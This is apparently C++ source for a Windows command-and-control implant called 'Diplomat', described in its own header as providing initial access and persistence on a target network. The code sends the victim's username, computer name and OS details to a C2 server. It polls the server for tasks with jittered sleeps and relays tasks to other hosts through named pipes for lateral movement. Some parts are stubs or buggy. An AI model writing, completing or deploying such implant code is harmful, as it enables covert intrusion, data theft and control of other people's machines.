/**************************************
 * This exe provides initial access
 * to a target network by establishing
 * persistence and http egress with the
 * linked C2 server
 * ***********************************/


#include <tchar.h>
#include <windows.h>
#include <stdio.h>
#include <winhttp.h>
#include <string>

#include "include/json_struct.h"
#include "include/persist.h"
#include "include/investigate.h"

struct TasksResponse{

    std::string Path;
    std::string Tasks;

    JS_OBJ(Path, Tasks);
};

// Contact C2 and provide basic computer info
void RegisterC2(){

    HINTERNET session = WinHttpOpen(
        L"Diplomat", 
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 
        WINHTTP_NO_PROXY_NAME, 
        WINHTTP_NO_PROXY_BYPASS, 
        0
    );

    if (session)
    {
        HINTERNET connection = WinHttpConnect(
            session, 
            L"127.0.0.1", 
            5000, 
            0
        );
        
        if (connection) {
            HINTERNET request = WinHttpOpenRequest(
                connection,
                L"POST",
                L"/register",
                L"HTTP/1.1",
                WINHTTP_NO_REFERER,
                WINHTTP_DEFAULT_ACCEPT_TYPES,
                0
            );
            
            if(request){
                std::wstring headers(L"Content-Type: application/json\r\n");
                char* jsonData = (char*) malloc(512);
                wchar_t* productID = ProductID();
                wchar_t* OSRelease = OSName();
                wchar_t* OSBuild = OSVersion();
                wchar_t* username = CurrentUser();
                std::string computerName = ComputerName();
                sprintf(jsonData, "{ \"ProductID\": \"%s\", \"OSName\": \"%s\", \"OSBuild\": \"%s\", \"Username\": \"%s\", \"ComputerName\": \"%s\" }", productID, OSRelease, OSBuild, username, computerName.c_str());
                size_t size = strlen(jsonData) * sizeof(char);

                BOOL result = WinHttpSendRequest(
                    request, 
                    headers.c_str(),
                    -1,
                    jsonData,
                    size,
                    size,
                    (DWORD_PTR)NULL
                );
                
                if(result){
                    result = WinHttpReceiveResponse(request, NULL);
                }
                DWORD responseSize;
                if(result){
                    result = WinHttpQueryDataAvailable(request, &responseSize);
                }
                if(result){
                    // Handle response
                }
            }else{
                printf("%d\n", GetLastError());
            }
            WinHttpCloseHandle(request);
        }else{
            printf("%d\n", GetLastError());
        }
        WinHttpCloseHandle(connection);
    }else{
        printf("%d\n", GetLastError());
    }
    WinHttpCloseHandle(session);
}

// Contact C2 and get commands to run
wchar_t* GetTasks(){
    HINTERNET session = WinHttpOpen(
        L"Diplomat", 
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 
        WINHTTP_NO_PROXY_NAME, 
        WINHTTP_NO_PROXY_BYPASS, 
        0
    );

    if (session)
    {
        HINTERNET connection = WinHttpConnect(
            session, 
            L"127.0.0.1", 
            5000, 
            0
        );
        
        if (connection) {
            wchar_t* buffer = (wchar_t*)malloc(1024);
            wchar_t* pid = ProductID();
            swprintf(buffer, 1024/sizeof(wchar_t), L"/tasks/%s", pid);

            HINTERNET request = WinHttpOpenRequest(
                connection,
                L"GET",
                buffer,
                L"HTTP/1.1",
                WINHTTP_NO_REFERER,
                WINHTTP_DEFAULT_ACCEPT_TYPES,
                0
            );
            
            if(request){
                BOOL result = WinHttpSendRequest(
                    request, 
                    WINHTTP_NO_ADDITIONAL_HEADERS,
                    -1,
                    WINHTTP_NO_REQUEST_DATA,
                    0,
                    0,
                    (DWORD_PTR)NULL
                );
                
                if(result){
                    result = WinHttpReceiveResponse(request, NULL);
                }
                DWORD responseSize;
                if(result){
                    result = WinHttpQueryDataAvailable(request, &responseSize);
                }
                if(result){
                    // Handle response
                    wchar_t* response = (wchar_t*)malloc(1024);
                    LPDWORD bytesRead;
                    if(WinHttpReadData(request, response, responseSize, bytesRead)){
                        return response;
                    }
                }
            }else{
                printf("%d\n", GetLastError());
            }
            WinHttpCloseHandle(request);
        }else{
            printf("%d\n", GetLastError());
        }
        WinHttpCloseHandle(connection);
    }else{
        printf("%d\n", GetLastError());
    }
    WinHttpCloseHandle(session);
    return (wchar_t*)NULL;
}


int _tmain(int argc, _TCHAR *argv[]){
    if(argc == 1){
        // Report intrusion to C2
        RegisterC2();
        PersistMe();

        // Periodically check for new commands from C2
        while(1){
            // the start of this section should only be happening on the egress node
            wchar_t* tasks = GetTasks();

            JS::ParseContext context((char*)tasks);
            TasksResponse tr;
            if (context.parseTo(tr) != JS::Error::NoError)
            {
                std::string errorStr = context.makeErrorString();
                fprintf(stderr, "Error parsing struct %s\n", errorStr.c_str());
                return -1;
            }

            printf("Path: %s\n", tr.Path.c_str());
            printf("Tasks: %s\n", tr.Tasks.c_str());

            std::string hostname = ComputerName();
            if(tr.Path.compare(hostname) == 0){
                // THIS IS THE DESTINATION, execute tasks

            }else{
                // Remove current hostname from path
                int index = tr.Path.find(',');
                tr.Path = tr.Path.substr(index+1);
                // Get name of next host in path
                index = tr.Path.find(',');
                std::string nextHostname;
                if(index == -1){
                    nextHostname == tr.Path;
                }else{
                    nextHostname = tr.Path.substr(0, index);
                }
                std::string filePath = "\\\\" + nextHostname + "\\pipe\\diplomat";
                printf("%s\n", filePath);

                // OK WE GO NEXT
                HANDLE hNextImplant = CreateFileA(
                    filePath.c_str(),
                    GENERIC_READ | GENERIC_WRITE,
                    FILE_SHARE_WRITE,
                    NULL,
                    OPEN_EXISTING,
                    FILE_ATTRIBUTE_NORMAL,
                    NULL
                );

                // ANYTHING IN HERE??
                DWORD bytesRead;
                void* buffer = malloc(1024);
                ReadFile(
                    hNextImplant,
                    buffer,
                    1023,
                    &bytesRead,
                    NULL
                );

                if(bytesRead != 0){
                    // contained data
                    // return the response to the c2 server
                    
                }

                // HERE, HAVE MY STRING
                std::string json = JS::serializeStruct(tr);
                DWORD bytesWritten;
                WriteFile(
                    hNextImplant,
                    json.c_str(),
                    json.size(),
                    &bytesWritten,
                    NULL
                );
                
                CloseHandle(hNextImplant);
                free(buffer);
            }

            int jitter = (rand() % 20000) - 10000;
            Sleep(30000+jitter);
        }
    }
}